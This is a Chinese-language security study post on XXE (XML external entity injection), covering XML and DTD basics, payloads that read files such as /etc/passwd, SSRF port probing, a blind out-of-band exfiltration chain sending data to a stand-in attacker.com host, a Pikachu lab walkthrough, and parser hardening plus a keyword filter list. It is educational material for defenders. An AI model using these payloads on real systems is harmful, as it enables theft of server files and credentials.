---
title: "XXE 外部实体注入"
published: 2026-09-22T23:16:00+08:00
description: "XXE 的成因、文件读取与 SSRF 利用链，以及禁用外部实体的防御方案。"
image: ""
tags:
  - 安全笔记
  - Web安全
category: 技术文章
draft: false
lang: zh-CN
pinned: false
comment: true
---

## 一、XXE 概述

### 1.1 什么是 XXE？

**XXE**（XML External Entity Injection，**XML 外部实体注入**）是一种利用 XML 解析器特性进行攻击的漏洞。

### 1.2 学习意义

| 场景         | 说明                                                |
| ------------ | --------------------------------------------------- |
| **漏扫设备** | AWVS、XRAY 等漏扫工具 100% 包含 XXE 检测规则        |
| **实际工作** | 防守方接触大量安全设备，做监控时需识别 XXE 攻击流量 |
| **HW 行动**  | 初级人员做监控，会看到大量包含 XXE 的攻击流量       |

------

## 二、XML 基础知识

### 2.1 什么是 XML？

| 特性     | 说明                                            |
| -------- | ----------------------------------------------- |
| 全称     | 可扩展标记语言（EXtensible Markup Language）    |
| 设计目的 | **传输数据/存储数据（配置文件）**，而非显示数据 |
| 标签     | 未被预定义，需自行定义                          |
| 特点     | 具有自我描述性                                  |

### 2.2 XML 与 HTML 的区别

| 对比     | HTML     | XML           |
| -------- | -------- | ------------- |
| 设计目的 | 显示数据 | 传输/存储数据 |
| 标签     | 预定义   | 自定义        |
| 作用     | 展示内容 | 描述数据      |

### 2.3 基础语法

```xml
<?xml version="1.0" encoding="UTF-8"?>
<note>
    <to>Tove</to>
    <from>Jani</from>
    <heading>Reminder</heading>
    <body>Don't forget me this weekend!</body>
</note>
```

### 2.4 语法规则

| 规则                       | 说明                    |
| -------------------------- | ----------------------- |
| 必须有**根元素**           | 如 `<note>` 是根元素    |
| XML 声明可选               | `<?xml version="1.0"?>` |
| 所有元素必须有**关闭标签** | `<tag></tag>`           |
| 标签**大小写敏感**         | `<Tag>` 和 `<tag>` 不同 |
| 必须**正确嵌套**           | `<a><b></b></a>`        |
| 属性值必须加**引号**       | `<img src="a.jpg"/>`    |
| 空格会被保留               | 不同于 HTML             |

### 2.5 命名规则

- 可包含字母、数字及其他字符
- **不能以数字或标点开头**
- **不能以** `xml`**（或 XML、Xml 等）开头**
- **不能包含空格**

------

## 三、DTD（文档类型定义）

### 3.1 什么是 DTD？

DTD 的作用是定义 XML 文档的**合法构建模块**。

拥有正确语法的 XML 称为"**形式良好**"的 XML。
通过 **DTD 验证**的 XML 称为"**合法**"的 XML。

### 3.2 内部 DTD

DTD 包含在 XML 源文件中：

```xml
<?xml version="1.0"?>
<!DOCTYPE note [
    <!ELEMENT note (to,from,heading,body)>
    <!ELEMENT to (#PCDATA)>
    <!ELEMENT from (#PCDATA)>
    <!ELEMENT heading (#PCDATA)>
    <!ELEMENT body (#PCDATA)>
]>
<note>
    <to>程咬金</to>
    <from>貂蝉</from>
    <heading>通知</heading>
    <body>今天晚上，大战三百回合！</body>
</note>
```

**元素声明解释：**

| 声明                                     | 含义                  |
| ---------------------------------------- | --------------------- |
| `<!DOCTYPE note>`                        | 此文档是 `note` 类型  |
| `<!ELEMENT note (to,from,heading,body)>` | note 包含 4 个子元素  |
| `<!ELEMENT to (#PCDATA)>`                | to 元素为 PCDATA 类型 |

### 3.3 PCDATA vs CDATA

| 类型       | 说明                                       |
| ---------- | ------------------------------------------ |
| **PCDATA** | 会被解析器**解析**的文本（检查实体和标记） |
| **CDATA**  | **不会**被解析器解析的文本                 |

### 3.4 外部 DTD

DTD 位于 XML 源文件外部：

```xml
<!DOCTYPE root-element SYSTEM "filename">
```

**note.dtd：**

```xml
<!ELEMENT note (to,from,heading,body)>
<!ELEMENT to (#PCDATA)>
<!ELEMENT from (#PCDATA)>
<!ELEMENT heading (#PCDATA)>
<!ELEMENT body (#PCDATA)>
```

**XML 引用：**

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE note SYSTEM "note.dtd">
<note>
    <to>周瑜</to>
    <from>黄盖</from>
    <heading>提示</heading>
    <body>老子不服输</body>
</note>
```

------

## 四、DTD 实体

### 4.1 内部实体

```xml
<!ENTITY entity-name "entity-value">
```

**示例：**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stu [
    <!ELEMENT stu (name, age, address)>
    <!ELEMENT name (#PCDATA)>
    <!ELEMENT age (#PCDATA)>
    <!ELEMENT address (#PCDATA)>
    <!ENTITY name "亚瑟">
    <!ENTITY age "18">
    <!ENTITY address "对抗路">
]>
<stu>
    <name>&name;</name>
    <age>&age;</age>
    <address>&address;</address>
</stu>
```

💡 实体由三部分构成：**&** + **实体名称** + **分号（;）**

### 4.2 外部实体（XXE 漏洞核心）

```xml
<!ENTITY entity-name SYSTEM "URI/URL">
```

**示例：**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root[
    <!ENTITY name SYSTEM "file:///D:/www/xxe/data.txt">
]>
<root>
    <username>&name;</username>
</root>
```

### 4.3 参数实体

```xml
<!ENTITY % 实体名称 "实体的值">
<!-- 或 -->
<!ENTITY % 实体名称 SYSTEM "URI">
```

**示例：**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
    <!ENTITY % name SYSTEM "http://localhost/xxe/test2.php">
    %name;
]>
```

⚠️ **注意：** `%` 和实体名称之间有一个空格！
参数实体**只能在 DTD 文件中被引用**，其他实体在 XML 文档内引用。

------

## 五、XXE 原理

```plain
攻击者构造恶意 XML → 提交到服务器 → 服务器解析 XML →
执行恶意实体引用 → 读取文件/探测内网/发起请求 → 返回结果
```

### 5.1 核心危险点

- XML 解析器**启用了外部实体解析**
- 用户输入的 XML 数据**未被过滤**
- 攻击者可以控制 `<!ENTITY>` 中的 `SYSTEM` 内容

------

## 六、XXE 利用方式

### 6.1 支持的协议

| 语言        | 支持的协议                                                   |
| ----------- | ------------------------------------------------------------ |
| **libxml2** | file、http、ftp                                              |
| **PHP**     | file、http、ftp、php、compress.zlib、compress.bzip2、data、glob、phar |
| **Java**    | file、http、https、ftp、jar、netdoc、mailto、gopher          |
| **.NET**    | file、http、https、ftp                                       |

### 6.2 文件读取

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ANY [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<x>&xxe;</x>
<!-- Windows -->
<!ENTITY xxe SYSTEM "file:///C:/windows/win.ini">
```

### 6.3 内网探测（XXE + SSRF）

```xml
<!ENTITY xxe SYSTEM "http://127.0.0.1:3306">
```

根据响应判断端口是否开放。

### 6.4 引入外部 DTD

**目标服务器 Payload：**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ANY [
    <!ENTITY % file SYSTEM "http://attacker.com/test.dtd">
    %file;
]>
<x>&send;</x>
```

**外部 test.dtd：**

```xml
<!ENTITY send SYSTEM "file:///etc/passwd">
```

### 6.5 DNSLog 检测

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ANY [
    <!ENTITY xxe SYSTEM "http://your.dnslog.domain">
]>
<x>&xxe;</x>
```

### 6.6 盲注（无回显）数据外带

#### 攻击流程

```plain
1. 准备参数实体 %file → 读取敏感数据（仅声明，未加载）
2. 准备参数实体 %dtd → 请求远程 remote.dtd（仅声明，未加载）
3. 加载 %dtd → 将 remote.dtd 中的实体包含进来
4. 加载 %send → 请求 http://attacker.com/xxe.php?data=%file
5. %file 被解析 → 数据拼接到 URL 中
6. 数据到达攻击者服务器
```

#### 攻击者服务器文件

**remote.dtd：**

```xml
<!ENTITY % payload "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/xxe.php?data=%file;'>">
%payload;
```

**xxe.php：**

```php
<?php
file_put_contents('1.txt', $_GET['data']);
?>
```

#### 目标服务器 Payload：

```xml
<?xml version="1.0"?>
<!DOCTYPE test [
    <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/inc/config.inc.php">
    <!ENTITY % dtd SYSTEM "http://attacker.com/remote.dtd">
    %dtd;
    %send;
]>
```

------

## 七、Pikachu 靶场实战

### 7.1 文件读取

```plain
POST /xxe/xxe.php
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ANY [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<x>&xxe;</x>
```

### 7.2 内网探测

```xml
<!ENTITY xxe SYSTEM "http://127.0.0.1:3306">
```

### 7.3 引入外部 DTD

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ANY [
    <!ENTITY % file SYSTEM "http://attacker.com/test.dtd">
    %file;
]>
<x>&send;</x>
```

## 八、XXE 防御

### 8.1 禁用外部实体（PHP）

```php
// 禁用外部实体加载（核心防御）
libxml_disable_entity_loader(true);
// 解析 XML 时指定安全选项
$xml = simplexml_load_string($data, "SimpleXMLElement", LIBXML_NOENT | LIBXML_DTDLOAD);
// 修改为：
$xml = simplexml_load_string($data, "SimpleXMLElement", LIBXML_NONET);
```

### 8.2 过滤用户输入的 XML

过滤关键词：

| 关键词      | 说明           |
| ----------- | -------------- |
| `<!DOCTYPE` | DTD 声明       |
| `<!ENTITY`  | 实体声明       |
| `SYSTEM`    | 外部实体关键字 |
| `PUBLIC`    | 公共实体关键字 |
| `file://`   | 文件协议       |
| `http://`   | HTTP 协议      |

### 8.3 安全配置

| 语言       | 防御方法                                                     |
| ---------- | ------------------------------------------------------------ |
| **PHP**    | `libxml_disable_entity_loader(true)`                         |
| **Java**   | 禁用外部实体：`factory.setFeature("http://xml.org/sax/features/external-general-entities", false)` |
| **Python** | `lxml.etree.XMLParser(resolve_entities=False)`               |
| **.NET**   | 设置 `XmlReaderSettings.ProhibitDtd = true`                  |

------

## 📌 快速参考卡片

### XML 基本结构

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [          <!-- DTD 定义（可选） -->
    <!ELEMENT root (child)>
    <!ENTITY name "value">
]>
<root>                    <!-- 根元素 -->
    <child>&name;</child> <!-- 引用实体 -->
</root>
```

### XXE Payload 速查

```xml
<!-- 读取文件 -->
<!ENTITY xxe SYSTEM "file:///etc/passwd">

<!-- 内网探测 -->
<!ENTITY xxe SYSTEM "http://127.0.0.1:3306">

<!-- DNSLog 检测 -->
<!ENTITY xxe SYSTEM "http://your.dnslog.domain">

<!-- 外部 DTD -->
<!ENTITY % file SYSTEM "http://attacker.com/test.dtd">

<!-- PHP 伪协议读文件（盲注常用） -->
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
```

### 防御速查

```php
// PHP 核心防御
libxml_disable_entity_loader(true);

// 解析时禁用网络
simplexml_load_string($xml, "SimpleXMLElement", LIBXML_NONET);
```

### XXE 盲注数据外带流程

```plain
目标服务器：
  1. %file = 读取敏感数据
  2. %dtd = 加载远程 remote.dtd
  3. %send = 发送数据到攻击者服务器

攻击者服务器：
  remote.dtd → 构造带 %file 的请求
  xxe.php → 接收并保存数据
```
